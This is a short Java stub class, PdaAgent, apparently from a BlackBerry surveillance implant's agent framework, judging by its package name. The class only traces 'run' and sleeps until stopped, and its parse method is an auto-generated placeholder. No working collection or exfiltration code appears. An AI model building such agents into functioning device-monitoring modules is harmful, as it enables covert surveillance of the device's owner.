package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class PdaAgent extends Agent {
    static Debug debug = new Debug("PdaAgent", DebugLevel.VERBOSE);

    public PdaAgent(int agentStatus) {
        super(Agent.AGENT_PDA, agentStatus, true);
    }

    protected PdaAgent(int agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void agentRun() {
        debug.trace("run");
        this.sleepUntilStopped();

    }

    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
